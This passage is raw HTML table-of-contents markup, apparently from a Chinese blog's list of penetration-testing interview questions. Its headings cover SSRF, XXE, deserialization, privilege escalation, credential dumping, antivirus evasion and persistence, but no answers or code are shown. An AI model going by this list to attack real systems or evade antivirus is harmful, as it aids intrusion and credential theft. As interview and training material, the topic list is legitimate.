toc-level-1"><a class="toc-link" href="#10-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%B3%BB%E5%88%97"><span class="toc-number">10.</span> <span class="toc-text">10- 权限维持系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86%E5%A6%82%E4%BD%95%E5%81%9A%E4%B8%80%E4%B8%AA-CDN-%E8%BF%9B%E8%A1%8C%E4%B8%AD%E8%BD%AC-1"><span class="toc-number">10.0.1.</span> <span class="toc-text">多级代理如何做一个 CDN 进行中转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#360-%E5%BC%80%E5%90%AF%E4%BA%86%E6%99%B6%E6%A0%B8%E6%A8%A1%E5%BC%8F%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8E%BB%E5%B0%9D%E8%AF%95%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">10.0.2.</span> <span class="toc-text">360 开启了晶核模式，怎么去尝试权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%A2%AB%E6%8B%A6%E6%88%AA%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">10.0.3.</span> <span class="toc-text">计划任务被拦截了怎么办</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-SSRF-%E7%B3%BB%E5%88%97"><span class="toc-number">11.</span> <span class="toc-text">11- SSRF 系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E4%BD%8D%E7%BD%AE"><span class="toc-number">11.0.1.</span> <span class="toc-text">SSRF 漏洞存在位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">11.0.2.</span> <span class="toc-text">SSRF 漏洞绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">11.0.3.</span> <span class="toc-text">SSRF 漏洞利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-number">11.0.4.</span> <span class="toc-text">SSRF 漏洞利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E5%A6%82%E4%BD%95%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1"><span class="toc-number">11.0.5.</span> <span class="toc-text">SSRF 如何攻击内网服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E5%A6%82%E4%BD%95%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1-1"><span class="toc-number">11.0.6.</span> <span class="toc-text">SSRF 如何攻击内网服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-%E6%80%8E%E4%B9%88%E7%94%A8-Redis-%E5%86%99-Shell"><span class="toc-number">11.0.7.</span> <span class="toc-text">SSRF 怎么用 Redis 写 Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-XXE-%E7%B3%BB%E5%88%97"><span class="toc-number">12.</span> <span class="toc-text">12- XXE 系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">12.0.1.</span> <span class="toc-text">XXE 漏洞利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-%E7%9B%B2%E6%B3%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">12.0.2.</span> <span class="toc-text">XXE 盲注思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PCDATA-%E5%92%8C-CDATA-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">12.0.3.</span> <span class="toc-text">PCDATA 和 CDATA 的区别</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">13.</span> <span class="toc-text">13- 文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">13.0.1.</span> <span class="toc-text">文件上传漏洞绕过方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-RCE-%E7%B3%BB%E5%88%97"><span class="toc-number">14.</span> <span class="toc-text">14- RCE 系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%BD%E6%95%B0%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">14.0.1.</span> <span class="toc-text">代码执行、命令执行的函数有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91-Shell-%E5%92%8C%E5%8F%8D%E5%90%91-Shell-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">14.0.2.</span> <span class="toc-text">正向 Shell 和反向 Shell 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91-Shell-%E5%92%8C%E5%8F%8D%E5%90%91-Shell-%E7%9A%84%E5%8C%BA%E5%88%AB-1"><span class="toc-number">14.0.3.</span> <span class="toc-text">正向 Shell 和反向 Shell 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-disable-functions-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">14.0.4.</span> <span class="toc-text">PHP disable_functions() 绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-%E7%9A%84-00-%E6%88%AA%E6%96%AD%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">14.0.5.</span> <span class="toc-text">PHP 的 %00 截断的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB%E6%80%8E%E4%B9%88%E6%8B%BF-Shell"><span class="toc-number">14.0.6.</span> <span class="toc-text">站库分离怎么拿 Shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">15.</span> <span class="toc-text">15- 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CC1%E3%80%81CC6-%E5%8C%BA%E5%88%AB"><span class="toc-number">15.0.1.</span> <span class="toc-text">CC1、CC6 区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%AE%B2-IIOP-%E5%92%8C-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">15.0.2.</span> <span class="toc-text">讲讲 IIOP 和 T3 反序列化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-invoke-%E5%8F%8D%E5%B0%84%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8"><span class="toc-number">15.0.3.</span> <span class="toc-text">Java invoke 反射具体利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E4%B8%80%E4%B8%8B-CC1-7-%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">15.0.4.</span> <span class="toc-text">讲一下 CC1-7 的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BECL-%E5%88%A9%E7%94%A8%E9%93%BE%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%8F%8A%E5%8E%9F%E7%90%86"><span class="toc-number">15.0.5.</span> <span class="toc-text">BECL 利用链使用条件及原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BCEL-%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%85%B6%E4%BB%96%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%90%97"><span class="toc-number">15.0.6.</span> <span class="toc-text">BCEL 可以用其他类加载器吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BCEL-%E4%B8%8E%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">15.0.7.</span> <span class="toc-text">BCEL 与类加载器的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3-JEP290-%E7%9A%84%E5%8E%9F%E7%90%86%E5%90%97"><span class="toc-number">15.0.8.</span> <span class="toc-text">了解 JEP290 的原理吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E4%B8%8B-RMI-%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">15.0.9.</span> <span class="toc-text">讲下 RMI 原理以及相关的漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl-%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91%E7%9A%84-JNDI-%E6%B3%A8%E5%85%A5"><span class="toc-number">15.0.10.</span> <span class="toc-text">JdbcRowSetImpl 如何触发的 JNDI 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC-%E9%93%BE%E5%9B%9B%E4%B8%AA-Transformer-%E5%8C%BA%E5%88%AB"><span class="toc-number">15.0.11.</span> <span class="toc-text">CC 链四个 Transformer 区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%99%A4%E4%BA%86readObject-%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">15.0.12.</span> <span class="toc-text">反序列化除了readObject 还有什么触发点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">16.</span> <span class="toc-text">16- 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%99%A4%E4%BA%86readObject-%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E8%A7%A6%E5%8F%91%E7%82%B9-1"><span class="toc-number">16.0.1.</span> <span class="toc-text">反序列化除了readObject 还有什么触发点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81%E7%9A%84%E8%AF%9D%E6%80%8E%E4%B9%88%E6%8A%93"><span class="toc-number">16.0.2.</span> <span class="toc-text">内网抓取密码的话怎么抓</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%9C%89%E6%9D%80%E8%BD%AF%E5%8F%88%E6%80%8E%E4%B9%88%E6%8A%93"><span class="toc-number">16.0.3.</span> <span class="toc-text">内网有杀软又怎么抓</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BB%80%E4%B9%88%E7%89%88%E6%9C%AC%E4%B9%8B%E5%90%8E%E6%8A%93%E4%B8%8D%E5%88%B0%E5%AF%86%E7%A0%81"><span class="toc-number">16.0.4.</span> <span class="toc-text">操作系统什么版本之后抓不到密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E4%B8%8D%E5%88%B0%E5%AF%86%E7%A0%81%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">16.0.5.</span> <span class="toc-text">抓不到密码怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%8C%E9%9D%A2%E6%9C%89%E7%AE%A1%E7%90%86%E5%91%98%E4%BC%9A%E8%AF%9D%EF%BC%8C%E6%80%8E%E4%B9%88%E5%81%9A%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81"><span class="toc-number">16.0.6.</span> <span class="toc-text">桌面有管理员会话，怎么做会话劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E5%89%8D%E6%9C%BA%E5%99%A8%E4%B8%8A%E6%9C%89%E4%B8%80%E4%B8%AA%E5%AF%86%E7%A0%81%E6%9C%AC%E4%BD%86%E8%A2%AB%E5%8A%A0%E5%AF%86%E4%BA%86%EF%BC%8C%E5%BA%94%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">16.0.7.</span> <span class="toc-text">当前机器上有一个密码本但被加密了，应该怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dcom-%E6%80%8E%E4%B9%88%E6%93%8D%E4%BD%9C"><span class="toc-number">16.0.8.</span> <span class="toc-text">Dcom 怎么操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-DCOM-%E8%8E%B7%E5%8F%96%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell"><span class="toc-number">16.0.9.</span> <span class="toc-text">利用 DCOM 获取交互式 Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">16.0.10.</span> <span class="toc-text">获取域控的方法有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL-%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86"><span class="toc-number">16.0.11.</span> <span class="toc-text">DLL 劫持原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DPAPI-%E6%9C%BA%E5%88%B6%E8%83%BD%E5%B9%B2%E5%98%9B"><span class="toc-number">16.0.12.</span> <span class="toc-text">DPAPI 机制能干嘛</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E-SMB-%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">16.0.13.</span> <span class="toc-text">与 SMB 协议相关的漏洞有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS14-068-%E5%8E%9F%E7%90%86"><span class="toc-number">16.0.14.</span> <span class="toc-text">MS14-068 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6-exe-%E8%90%BD%E5%9C%B0%E6%80%8E%E4%B9%88%E5%8E%BB%E5%81%9A%EF%BC%8C%E7%94%A8%E4%BB%80%E4%B9%88%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%89%A7%E8%A1%8C%E6%9D%A5%E8%90%BD%E5%9C%B0"><span class="toc-number">16.0.15.</span> <span class="toc-text">内网文件 exe 落地怎么去做，用什么命令去执行来落地</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DB-%E6%96%87%E4%BB%B6%E5%A6%82%E4%BD%95%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">16.0.16.</span> <span class="toc-text">DB 文件如何解密，原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH-%E4%B8%AD-LM-hash-%E5%92%8C-NTLM-hash-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">16.0.17.</span> <span class="toc-text">PTH 中 LM hash 和 NTLM hash 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Print-Nightmare-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">16.0.18.</span> <span class="toc-text">Print Nightmare 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS-%E5%9F%9F%E5%89%8D%E7%BD%AE%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">16.0.19.</span> <span class="toc-text">CS 域前置的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS-%E6%B5%81%E9%87%8F%E6%98%AF%E6%80%8E%E4%B9%88%E9%80%9A%E4%BF%A1%E7%9A%84"><span class="toc-number">16.0.20.</span> <span class="toc-text">CS 流量是怎么通信的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-number">16.0.21.</span> <span class="toc-text">脏牛漏洞提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%8C%BA%E5%88%AB"><span class="toc-number">16.0.22.</span> <span class="toc-text">黄金票据和白银票据区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%88%B0-hash-%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">16.0.23.</span> <span class="toc-text">读取不到 hash 怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E5%9C%A8%E6%9C%89%E4%B8%80%E5%8F%B0-Windows-Server-2008-%E5%A6%82%E4%BD%95%E6%8F%90%E6%9D%83"><span class="toc-number">16.0.24.</span> <span class="toc-text">现在有一台 Windows Server 2008 如何提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%97%B6%E9%80%89%E6%8B%A9%E5%8F%AF%E8%AF%BB%E5%86%99%E7%9B%AE%E5%BD%95%EF%BC%8C%E4%B8%BA%E4%BD%95%E5%B0%BD%E9%87%8F%E4%B8%8D%E7%94%A8%E5%B8%A6%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%9B%AE%E5%BD%95"><span class="toc-number">16.0.25.</span> <span class="toc-text">提权时选择可读写目录，为何尽量不用带空格的目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E8%80%8C%E5%8F%AA%E8%83%BD%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C%E7%9A%84-Shell-%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">16.0.26.</span> <span class="toc-text">对于不能直接上传而只能通过命令行执行的 Shell 怎么办</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#psexec-%E5%92%8C-wmic-%E5%8C%BA%E5%88%AB"><span class="toc-number">16.0.27.</span> <span class="toc-text">psexec 和 wmic 区别</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#17-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.</span> <span class="toc-text">17- 文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8D%8F%E8%AE%AE%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">17.0.1.</span> <span class="toc-text">常用的协议有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88-GetShell"><span class="toc-number">17.0.2.</span> <span class="toc-text">怎么 GetShell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#18-MongoDB%E6%B3%A8%E5%85%A5"><span class="toc-number">18.</span> <span class="toc-text">18- MongoDB注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MongoDB-%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">18.0.1.</span> <span class="toc-text">MongoDB 注入方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#19-CORS-%E7%B3%BB%E5%88%97"><span class="toc-number">19.</span> <span class="toc-text">19- CORS 系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">19.0.1.</span> <span class="toc-text">CORS 利用方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#20-%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E7%B3%BB%E5%88%97"><span class="toc-number">20.</span> <span class="toc-text">20- 远控免杀系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-number">20.0.1.</span> <span class="toc-text">CORS 利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8E%BB%E8%BF%87%E5%9B%BD%E5%86%85%E7%9A%84%E6%9D%80%E8%BD%AF"><span class="toc-number">20.0.2.</span> <span class="toc-text">如何去过国内的杀软</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%92%8C%E5%8D%95%E4%BD%93%E5%85%8D%E6%9D%80%E6%9C%89%E5%95%A5%E5%8C%BA%E5%88%AB%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%88%86%E7%A6%BB"><span class="toc-number">20.0.3.</span> <span class="toc-text">分离免杀和单体免杀有啥区别，为什么要分离</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E8%BF%87%E5%85%B6%E4%BB%96%E5%85%8D%E6%9D%80%E5%90%97%EF%BC%8C%E6%AF%94%E5%A6%82%E7%BB%93%E5%90%88-CS-%E5%92%8C-MSF-%E7%9A%84"><span class="toc-number">20.0.4.</span> <span class="toc-text">做过其他免杀吗，比如结合 CS 和 MSF 的</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#21-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97"><span class="toc-number">21.</span> <span class="toc-text">21- PHP代码审计系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%92%8C-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">21.0.1.</span> <span class="toc-text">&#x3D;&#x3D;&#x3D; 和 &#x3D;&#x3D; 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%83%BD%E4%B8%8D%E8%83%BD%E9%80%9A%E8%BF%87-PHP-%E9%85%8D%E7%BD%AE%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E8%B7%AF%E5%BE%84"><span class="toc-number">21.0.2.</span> <span class="toc-text">本地文件包含能不能通过 PHP 配置限制文件包含的路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-%E5%9C%A8%E5%81%9A-SQL-%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%97%B6%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E6%B3%95"><span class="toc-number">21.0.3.</span> <span class="toc-text">PHP 在做 SQL 注入防御时有哪些方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E5%AE%A1%E8%AE%A1%E5%88%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E6%B7%B1%E5%85%A5%E7%9A%84%E5%8E%BB%E5%88%A9%E7%94%A8"><span class="toc-number">21.0.4.</span> <span class="toc-text">如果审计到了一个文件下载漏洞如何深入的去利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%AE%B2-Fortity-%E7%AD%89%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7%E5%8E%9F%E7%90%86"><span class="toc-number">21.0.5.</span> <span class="toc-text">讲讲 Fortity 等代码审计工具原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0%E6%80%8E%E4%B9%88%E6%89%BE"><span class="toc-number">21.0.6.</span> <span class="toc-text">常见入口函数怎么找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">21.0.7.</span> <span class="toc-text">PHP 代码审计流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP-%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1%E8%B5%B7%E6%9D%A5%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C"><span class="toc-number">21.0.8.</span> <span class="toc-text">ThinkPHP 框架审计起来有什么不同</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-%E5%8E%9F%E7%94%9F%E7%9A%84%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">21.0.9.</span> <span class="toc-text">PHP 原生的敏感函数有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E6%9C%89%E5%93%AA%E4%BA%9B%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%85%A5%E6%89%8B%E7%82%B9%E5%8E%BB%E6%89%BE%E7%9A%84"><span class="toc-number">21.0.10.</span> <span class="toc-text">反序列化时有哪些魔术方法是可以作为一个入手点去找的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%B7%AF%E7%94%B1%E6%96%B9%E6%B3%95"><span class="toc-number">21.0.11.</span> <span class="toc-text">常见的路由方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%8B-PHP-%E7%9A%84%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">21.0.12.</span> <span class="toc-text">介绍下 PHP 的变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E8%BF%99%E4%B8%A4%E7%A7%8D%E6%B6%89%E5%8F%8A%E7%9A%84-PHP-%E8%AE%BE%E7%BD%AE%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-number">21.0.13.</span> <span class="toc-text">远程文件包含和本地文件包含这两种涉及的 PHP 设置有什么</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#22-Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97"><span class="toc-number">22.</span> <span class="toc-text">22- Java 代码审计系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA-%E5%9C%A8%E5%81%9A-SQL-%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%97%B6%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E6%B3%95"><span class="toc-number">22.0.1.</span> <span class="toc-text">JAVA 在做 SQL 注入防御时有哪些方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">23.</span> <span class="toc-text">23- 操作系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">23.0.1.</span> <span 